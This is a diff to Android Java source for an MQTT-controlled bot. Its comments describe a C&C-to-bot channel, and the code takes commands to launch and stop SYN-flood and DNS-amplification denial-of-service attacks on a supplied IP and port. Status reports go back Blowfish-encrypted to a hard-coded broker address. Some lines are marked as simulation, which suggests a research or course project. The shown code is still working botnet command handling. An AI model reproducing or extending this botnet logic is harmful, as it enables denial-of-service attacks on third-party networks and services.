@@ -49,9 +49,8 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
     Thread t;
     String IPDestino,puertoDestino;
     MqttAndroidClient clientSyn;
-    boolean hiloOcupado = false;
+    boolean busyThread = false;
     int DoS = 0;
-
 
     MyThread(String IP, String port,int tipoDos,MqttAndroidClient client) throws MqttException //Constructor
     {
@@ -61,9 +60,7 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
         this.clientSyn = client;
         t = new Thread(this);
         t.start(); // Empieza el hilo
-
-
-
+        
     }
 
     // execution of thread starts from run() method
@@ -102,6 +99,45 @@ class MyThread implements Runnable { //Hilo implementado para crear inundación 
 
             } catch (Exception e) {
                 e.printStackTrace();
+                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
+                MqttApplication.editor.apply();
+                MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", false);
+                MqttApplication.editor.apply();
+                MqttApplication.editor.putBoolean("DOS_AMP_DNS", false);
+                MqttApplication.editor.apply();
+                t.interrupt();
+
+                String errorMessage = "Error (3): Sin acceso como SU.";
+                String id = MqttApplication.sharedPreferences.getString("ID","-");
+                id = "73059017-c2c8-43af-9c48-41481c6dec85"; //SIMULACIÓN
+                int firstTime = 0; //SIMULACIÓN
+                String deviceInfo = "";
+                if(this.DoS == 1){
+                    deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
+                }else if(this.DoS == 2){
+                    deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+errorMessage+"\"}"+firstTime+"&";
+                }
+
+                //Cifrando
+                Blowfish blowfish = new Blowfish();
+                ByteArrayOutputStream bytesMqtt = new ByteArrayOutputStream();
+                final String encryptKey = UUID.randomUUID().toString().replace("-", "").substring(0, 4);
+
+                try {
+                    bytesMqtt.write(encryptKey.getBytes());
+                    bytesMqtt.write(blowfish.encrypt(encryptKey,deviceInfo));
+                } catch (Exception error) {
+                    error.printStackTrace();
+                }
+
+                MqttMessage mqttMessage = new MqttMessage(bytesMqtt.toByteArray());
+
+                try {
+                    this.clientSyn.publish("CyC",mqttMessage);
+                } catch (MqttException errorMQTT) {
+                    errorMQTT.printStackTrace();
+                }
+                
             }
 
         }
@@ -115,8 +151,11 @@ public class MqttConnectionManagerService extends Service {
     private static final String TAG = "MqttConnectionManagerSe";
     private MqttAndroidClient client;
     private MqttAndroidClient client2; //SIMULACIÓN <--------------
-    private boolean hiloOcupado = false; //Valiación  de 1 solo DoS a la vez,
-    private boolean dosFloodSyn = false, dosAmpDns = false;
+
+    final boolean busyThread = MqttApplication.sharedPreferences.getBoolean("BUSY_THREAD", false);
+    final boolean dosFloodSyn = MqttApplication.sharedPreferences.getBoolean("DOS_FLOOD_SYN", false);
+    final boolean dosAmpDns = MqttApplication.sharedPreferences.getBoolean("DOS_AMP_DNS", false);
+
     MyThread t1; //Para matar proceso del case 10,13
 
 
@@ -189,10 +228,8 @@ public class MqttConnectionManagerService extends Service {
         client2 = new MqttAndroidClient(getApplication().getApplicationContext(), "tcp://187.208.132.150:1883",
                 clientId2); //SIMULACIÓN <-------------
 
-        final SharedPreferences sharedPreferences = getApplication().getApplicationContext().getSharedPreferences("IoTE", Context.MODE_PRIVATE);
-        final String id = sharedPreferences.getString("ID", "-");
-        final  int firstTime = sharedPreferences.getInt("FIRST_TIME", 1);
-
+        final String id = MqttApplication.sharedPreferences.getString("ID", "-");
+        final  int firstTime = MqttApplication.sharedPreferences.getInt("FIRST_TIME", 1);
 
         try {
             IMqttToken token = client.connect();
@@ -559,9 +596,9 @@ public class MqttConnectionManagerService extends Service {
                             entre C&C-Bot. Nota: Si no se crea el hilo, los camndos 1,2,3..
                             dejan de ser recibidos por el bot, lo cual imposibilita detener
                             la inundación SYN.*/
-                             if(!hiloOcupado && !dosFloodSyn){
+                             if(!busyThread && !dosFloodSyn){
 
-                                 t1 = new MyThread(splited[1],splited[2],1,client);
+                                 t1 = new MyThread(splited[1],splited[2],1,client2);
 
                                  String floodSyn = "Iniciada";
                                  String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -584,11 +621,14 @@ public class MqttConnectionManagerService extends Service {
                                  } catch (MqttException e) {
                                      e.printStackTrace();
                                  }
-                                 //Cambio de estado de las banderas
-                                 hiloOcupado = true;
-                                 dosFloodSyn = true;
+                                 //Cambio de estado de las bandera
+                                 MqttApplication.editor.putBoolean("BUSY_THREAD", true);
+                                 MqttApplication.editor.apply();
 
-                             }else if (hiloOcupado){
+                                 MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", true);
+                                 MqttApplication.editor.apply();
+
+                             }else if (busyThread){
 
                                  String floodSyn = "Error (1) Solo un DDoS a la vez";
                                  String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"9\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -618,10 +658,13 @@ public class MqttConnectionManagerService extends Service {
 
                         case 10:
 
-                            if(hiloOcupado && dosFloodSyn){
+                            if(busyThread && dosFloodSyn){
 
-                                hiloOcupado = false;
-                                dosFloodSyn = false;
+                                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
+                                MqttApplication.editor.apply();
+                                MqttApplication.editor.putBoolean("DOS_FLOOD_SYN", false);
+                                MqttApplication.editor.apply();
+
                                 t1.t.interrupt(); //para el hilo...
 
                                 try {
@@ -686,8 +729,8 @@ public class MqttConnectionManagerService extends Service {
 
                         case 11:
 
-                            if(!hiloOcupado && !dosAmpDns){
-                                t1 = new MyThread(splited[1],splited[2],2,client);
+                            if(!busyThread && !dosAmpDns){
+                                t1 = new MyThread(splited[1],splited[2],2,client2);
 
                                 String ampDns = "Iniciada";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+ampDns+"\"}"+firstTime+"&";
@@ -711,10 +754,12 @@ public class MqttConnectionManagerService extends Service {
                                     e.printStackTrace();
                                 }
                                 //Cambio de estado de las banderas
-                                hiloOcupado = true;
-                                dosAmpDns = true;
+                                MqttApplication.editor.putBoolean("BUSY_THREAD", true);
+                                MqttApplication.editor.apply();
+                                MqttApplication.editor.putBoolean("DOS_AMP_DNS", true);
+                                MqttApplication.editor.apply();
 
-                            }else if (hiloOcupado){
+                            }else if (busyThread){
 
                                 String floodSyn = "Error (1) Solo un DDoS a la vez";
                                 String deviceInfo = "{\"device\":\""+ id +"\",\"field\": \"10\", \"value\": \""+floodSyn+"\"}"+firstTime+"&";
@@ -744,9 +789,11 @@ public class MqttConnectionManagerService extends Service {
 
                         case 12:
 
-                            if(hiloOcupado && dosAmpDns){
-                                hiloOcupado = false;
-                                dosAmpDns = false;
+                            if(busyThread && dosAmpDns){
+                                MqttApplication.editor.putBoolean("BUSY_THREAD", false);
+                                MqttApplication.editor.apply();
+                                MqttApplication.editor.putBoolean("DOS_AMP_DNS", false);
+                                MqttApplication.editor.apply();
                                 t1.t.interrupt(); //para el hilo...
 
                                 try {
